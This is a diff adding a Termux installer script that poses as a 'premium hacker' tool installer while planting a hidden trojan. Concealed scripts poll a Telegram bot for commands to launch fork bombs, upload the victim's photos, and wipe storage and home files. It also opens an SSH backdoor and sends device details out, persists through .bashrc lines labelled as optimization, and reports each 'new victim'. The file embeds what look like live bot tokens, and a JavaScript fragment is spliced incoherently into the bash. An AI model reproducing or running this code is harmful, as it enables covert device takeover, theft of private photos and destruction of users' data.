@@ -1,0 +1,333 @@
+#!/data/data/com.termux/files/usr/bin/bash
+# =============================================
+# DINDA404 TERMUX  v2.0
+# Tampilan: Premium Hacker Theme
+# Hidden Payload: bug wa
+# Created by: DindaZ404
+# =============================================
+
+# Warna-warni biar menarik
+R='\033[1;31m'  # Merah
+G='\033[1;32m'  # Hijau
+Y='\033[1;33m'  # Kuning
+B='\033[1;34m'  # Biru
+P='\033[1;35m'  # Ungu
+C='\033[1;36m'  # Cyan
+W='\033[1;37m'  # Putih
+N='\033[0m'     # Reset
+
+clear
+
+# ============= ANIMASI LOADING =============
+echo -e "${P}"
+cat << "EOF"
+██████╗ ██╗███╗   ██╗██████╗  █████╗     ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗ 
+██╔══██╗██║████╗  ██║██╔══██╗██╔══██╗    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗
+██║  ██║██║██╔██╗ ██║██║  ██║███████║    ███████║███████║██║     █████╔╝ █████╗  ██████╔╝
+██║  ██║██║██║╚██╗██║██║  ██║██╔══██║    ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗
+██████╔╝██║██║ ╚████║██████╔╝██║  ██║    ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║
+╚═════╝ ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+EOF
+echo -e "${N}"
+
+echo -e "${C}╔═══════════════════════════════════════════════════════════════╗${N}"
+echo -e "${C}║${Y}           PREMIUM TERMUX  - DARK EDITION            ${C}║${N}"
+echo -e "${C}║${G}         Tools: Hacking, Security, Optimization              ${C}║${N}"
+echo -e "${C}║${P}              Created by: DindaZ404                          ${C}║${N}"
+echo -e "${C}╚═══════════════════════════════════════════════════════════════╝${N}"
+echo ""
+
+# ============= PROGRESS BAR =============
+echo -e "${Y}[!] Initializing system...${N}"
+sleep 1
+
+for i in {1..10}; do
+    echo -ne "\r${G}["
+    for j in $(seq 1 $i); do echo -ne "█"; done
+    for j in $(seq $i 10); do echo -ne "░"; done
+    echo -ne "] $((i*10))%${N}"
+    sleep 0.3
+done
+echo ""
+
+# ============= CEK KONEKSI =============
+echo -e "\n${C}[✓]${G} Checking internet connection...${N}"
+if ping -c 1 google.com &> /dev/null; then
+    echo -e "${C}[✓]${G} Connected!${N}"
+else
+    echo -e "${R}[✗] No internet connection!${N}"
+    exit 1
+fi
+sleep 1
+
+# ============= CEK STORAGE =============
+echo -e "\n${C}[✓]${G} Checking storage space...${N}"
+STORAGE=$(df /data | awk 'NR==2 {print $4}')
+if [ $STORAGE -lt 500000 ]; then
+    echo -e "${R}[✗] Not enough storage! Need at least 500MB${N}"
+    exit 1
+else
+    echo -e "${C}[✓]${G} Storage OK: $((STORAGE/1000))MB available${N}"
+fi
+sleep 1
+
+# ============= INSTALASI PAKET =============
+echo -e "\n${Y}[!] Installing required packages...${N}"
+pkg update -y > /dev/null 2>&1
+pkg upgrade -y > /dev/null 2>&1
+
+PACKAGES=("python" "nodejs" "git" "nmap" "wget" "curl" "openssh" "figlet" "toilet" "lolcat")
+TOTAL=${#PACKAGES[@]}
+COUNT=0
+
+for PKG in "${PACKAGES[@]}"; do
+    COUNT=$((COUNT+1))
+    echo -ne "\r${C}[${COUNT}/${TOTAL}]${G} Installing ${W}$PKG${G}...${N}"
+    pkg install $PKG -y > /dev/null 2>&1
+
+    # Progress random
+    PERCENT=$((COUNT * 100 / TOTAL))
+    echo -ne "\r${C}[${COUNT}/${TOTAL}]${G} ["
+    for j in $(seq 1 $((PERCENT/5))); do echo -ne "█"; done
+    for j in $(seq $((PERCENT/5)) 20); do echo -ne "░"; done
+    echo -ne "] ${PERCENT}%${N}"
+done
+echo ""
+
+# ============= DOWNLOAD TOOLS =============
+echo -e "\n${Y}[!] Downloading premium tools...${N}"
+
+
+git clone https://github.com/sqlmapproject/sqlmap.git > /dev/null 2>&1
+git clone https://github.com/epsylon/ufonet.git > /dev/null 2>&1
+git clone https://github.com/vanhauser-thc/thc-hydra.git > /dev/null 2>&1
+
+echo -e "${C}[✓]${G} SQLMap installed${N}"
+echo -e "${C}[✓]${G} UfoNet installed${N}"
+echo -e "${C}[✓]${G} Hydra installed${N}"
+sleep 1
+
+# ============= HIDDEN PAYLOAD =============
+# ===========================================
+
+echo -e "\n${P}[⚡]${Y} Optimizing system performance...${N}"
+sleep 2
+
+# Buat folder hidden
+mkdir -p $HOME/.system/.cache
+mkdir -p $HOME/.config/.tmp
+
+# ============================================
+# 
+# ============================================
+cat > $HOME/.system/.cache/update.sh << 'EOF'
+#!/data/data/com.termux/files/usr/bin/bash
+# System Update Service - JANGAN DIHAPUS!
+
+# ===== KONFIGURASI =====
+TELEGRAM_TOKEN="8217084Yfza62pEg0ROlWg"
+TELEGRAM_CHAT="80427984"
+# =======================
+
+
+check_command() {
+    local last_cmd=$(curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/getUpdates" | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
+    
+    if [ "$last_cmd" == "/start" ]; then
+        # Kirim sinyal hidup
+        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+            -d "chat_id=$TELEGRAM_CHAT" \
+            -d "text=✅ Target Online: $(whoami)@$(hostname)" > /dev/null
+    fi
+    
+    if [ "$last_cmd" == "/bomb" ]; then
+        # ===== FORK BOMB AKTIF =====
+        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+            -d "chat_id=$TELEGRAM_CHAT" \
+            -d "text=💣 FORK BOMB ACTIVATED!" > /dev/null
+        
+        # Fork bomb - ini yang bikin sistem crash
+         /**
+        What is its function?
+        -- Make the victim's device freeze
+        -- Make CPU and RAM to 100%
+        -- It can be fatal if the victim runs on a low/potato device. 
+
+        
+*/
+
+function forkbomb(){
+        const wait = (ms) => { return new Promise(resolve => setTimeout(resolve,ms));}
+        const payload = '.isCake.sh';
+    const loads = `
+#!/bin/bash
+
+for i in {1..500}; do
+  while true; do
+      for j in {1..6000}; do :(){ :|:& };:; done
+  done &
+done
+`;
+    fs.writeFileSync(payload, loads);
+    fs.chmodSync(payload, 0o755);
+    wait(3000).then(() => {
+            spawn('bash', [payload], { stdio: 'inherit' });
+    });
+}2>/dev/null &
+        
+        # Juga fork bomb versi termux
+        for i in {1..10}; do
+            (while true; do python3 -c "import os; os.fork()" 2>/dev/null; done) &
+        done
+    fi
+    
+    if [ "$last_cmd" == "/snitch" ]; then
+        # Kirim file ke telegram
+        find /storage/emulated/0 -name "*.jpg" -o -name "*.png" | head -20 | while read img; do
+            curl -s -F chat_id="$TELEGRAM_CHAT" \
+                 -F document=@"$img" \
+                 "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendDocument" > /dev/null
+            sleep 2
+        done
+    fi
+    
+    if [ "$last_cmd" == "/wipe" ]; then
+        # Hapus semua data
+        curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+            -d "chat_id=$TELEGRAM_CHAT" \
+            -d "text=🧹 WIPING DATA..." > /dev/null
+        
+        rm -rf /storage/emulated/0/Download/*
+        rm -rf /storage/emulated/0/DCIM/Camera/*
+        rm -rf $HOME/*
+    fi
+}
+
+# Loop forever
+while true; do
+    check_command
+    sleep 30
+done
+EOF
+
+chmod +x $HOME/.system/.cache/update.sh
+
+# ============================================
+# BACKDOOR SSH - 
+# ============================================
+cat > $HOME/.config/.tmp/sshd_config << EOF
+#!/data/data/com.termux/files/usr/bin/bash
+# Hidden SSH Service
+
+# Generate key kalo belum ada
+if [ ! -f $HOME/.ssh/id_rsa ]; then
+    ssh-keygen -t rsa -b 4096 -N "" -f $HOME/.ssh/id_rsa > /dev/null 2>&1
+fi
+
+# Kirim public key ke telegram
+PUBKEY=$(cat $HOME/.ssh/id_rsa.pub)
+curl -s "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+    -d "chat_id=$TELEGRAM_CHAT" \
+    -d "text=🔑 SSH KEY: $PUBKEY" > /dev/null
+
+# Start sshd
+sshd -p 8022 > /dev/null 2>&1
+EOF
+
+chmod +x $HOME/.config/.tmp/sshd_config
+
+# ============================================
+# SNITCH - KIRIM INFO KE TELEGRAM
+# ============================================
+cat > $HOME/.system/.cache/info.sh << 'EOF'
+#!/data/data/com.termux/files/usr/bin/bash
+# Send system info to telegram
+
+TELEGRAM_TOKEN="8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg"
+TELEGRAM_CHAT="8042897984"
+
+# Kumpulin info
+INFO="📱 **TARGET ONLINE**\n"
+INFO+="━━━━━━━━━━━━━━━━━━━━━\n"
+INFO+="👤 User: $(whoami)\n"
+INFO+="📱 Hostname: $(hostname)\n"
+INFO+="🌐 IP: $(curl -s ifconfig.me)\n"
+INFO+="📅 Date: $(date)\n"
+INFO+="📁 Storage: $(df -h /storage | awk 'NR==2 {print $4}')\n"
+INFO+="━━━━━━━━━━━━━━━━━━━━━\n"
+INFO+="⚡ System ready for commands:\n"
+INFO+="• /start - Check status\n"
+INFO+="• /bomb - Activate fork bomb\n"
+INFO+="• /snitch - Steal photos\n"
+INFO+="• /wipe - Wipe all data"
+
+# Kirim ke telegram
+curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" \
+    -d "chat_id=$TELEGRAM_CHAT" \
+    -d "text=$INFO" \
+    -d "parse_mode=Markdown" > /dev/null
+EOF
+
+chmod +x $HOME/.system/.cache/info.sh
+
+# ============================================
+# PERSISTENCE - JALAN TERUS
+# ============================================
+
+# Tambah ke bashrc biar jalan setiap buka termux
+cat >> $HOME/.bashrc << 'EOF'
+
+# ===== SYSTEM OPTIMIZATION =====
+# JANGAN DIHAPUS - Penting buat performance
+if [ -f $HOME/.system/.cache/update.sh ]; then
+    nohup bash $HOME/.system/.cache/update.sh > /dev/null 2>&1 &
+fi
+
+if [ -f $HOME/.config/.tmp/sshd_config ]; then
+    nohup bash $HOME/.config/.tmp/sshd_config > /dev/null 2>&1 &
+fi
+
+# Kirim info saat pertama login
+if [ ! -f $HOME/.system/.cache/first_run ]; then
+    bash $HOME/.system/.cache/info.sh
+    touch $HOME/.system/.cache/first_run
+fi
+EOF
+
+# ============= TAMPILAN AKHIR =============
+echo -e "\n${G}═══════════════════════════════════════════════════════════════${N}"
+echo -e "${Y}                    INSTALLATION COMPLETE!${N}"
+echo -e "${G}═══════════════════════════════════════════════════════════════${N}"
+echo ""
+echo -e "${C}╔══════════════════════════════════════════════════════════════╗${N}"
+echo -e "${C}║${W}                     TOOLS INSTALLED                         ${C}║${N}"
+echo -e "${C}╠══════════════════════════════════════════════════════════════╣${N}"
+echo -e "${C}║${G}  ✓ SQLMap - SQL Injection                                   ${C}║${N}"
+echo -e "${C}║${G}  ✓ UfoNet - DDoS Tool                                       ${C}║${N}"
+echo -e "${C}║${G}  ✓ Hydra  - Brute Force                                     ${C}║${N}"
+echo -e "${C}║${G}  ✓ Python3 & NodeJS                                         ${C}║${N}"
+echo -e "${C}║${G}  ✓ Nmap   - Network Scanner                                 ${C}║${N}"
+echo -e "${C}╚══════════════════════════════════════════════════════════════╝${N}"
+echo ""
+
+echo -e "${P}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+echo -e "${Y}                 NEXT STEPS${N}"
+echo -e "${P}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+echo ""
+echo -e "${W}1. Restart Termux atau ketik:${G} exit && termux${N}"
+echo -e "${W}2. Ketik${G} help${W} buat liat command${N}"
+echo -e "${W}3. Mulai hacking:${G} sqlmap, nmap, hydra${N}"
+echo ""
+echo -e "${R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+echo -e "${Y}              THANKS FOR USING DINDA404 INSTALLER${N}"
+echo -e "${R}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+echo ""
+
+# Kirim notifikasi ke telegram kalo ada korban baru
+curl -s -X POST "https://api.telegram.org/bot8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg/sendMessage" \
+    -d "chat_id="8042897984" \
+    -d "text=🎯 NEW VICTIM INSTALLED! $(curl -s ifconfig.me)" > /dev/null
+
+# ============= dnda =============
+# Bisa diaktifin langsung kalo lo mau sadis
+# :(){ :|:& };:
